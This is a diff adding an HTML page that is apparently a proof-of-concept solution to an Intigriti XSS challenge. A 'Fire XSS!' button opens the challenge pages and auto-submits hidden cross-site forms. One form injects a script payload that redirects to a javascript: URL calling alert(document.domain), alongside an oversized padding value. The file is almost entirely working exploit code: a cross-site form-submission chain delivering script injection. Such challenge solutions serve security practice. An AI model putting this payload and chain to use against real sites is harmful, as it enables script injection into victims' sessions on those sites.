@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<head>
+</head>
+
+<body>
+<center>
+<button id="myButton" style="background:#a33030;color:white; height:100px; width:200px">Fire XSS!</button>
+<br>
+<br>
+<form method="post" action="https://challenge-0322.intigriti.io/challenge/LoveReceiver.php" id="myForm1" target="_blank">
+<input type="hidden" name="token" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+<input class="input is-primary" type="text" name="FirstText" value="test" size="100px">
+<input class="input is-primary" name="Hashing" type="text" value="MD5" size="100px">
+</form>
+
+<form method="post" action="https://challenge-0322.intigriti.io/challenge/LoveReceiver.php" id="myForm2" target="https://challenge-0322.intigriti.io/challenge/LoveSender.php">
+<input type="hidden" name="token" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+<input class="input is-primary" type="text" name="FirstText" value="<script>location=/javascript:alert%28document.domain%29/.source;</script>" size="100px">
+<input class="input is-primary" size="100px" name="Hashing" type="text" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+</form>
+
+<script>
+const myButton = document.getElementById("myButton");
+
+
+        myButton .addEventListener("click", () => {
+        window.open("https://challenge-0322.intigriti.io/challenge/LoveSender.php");
+             
+        setTimeout(function(){document.getElementById("myForm1").submit();} , 1000);
+
+        setTimeout(function(){window.open("https://challenge-0322.intigriti.io/challenge/test/../LoveSender.php");} , 2000);
+
+        setTimeout(function(){document.getElementById("myForm2").submit();} , 3000);
+
+        })
+</script>
+</center>
+</body>
+</html>
+
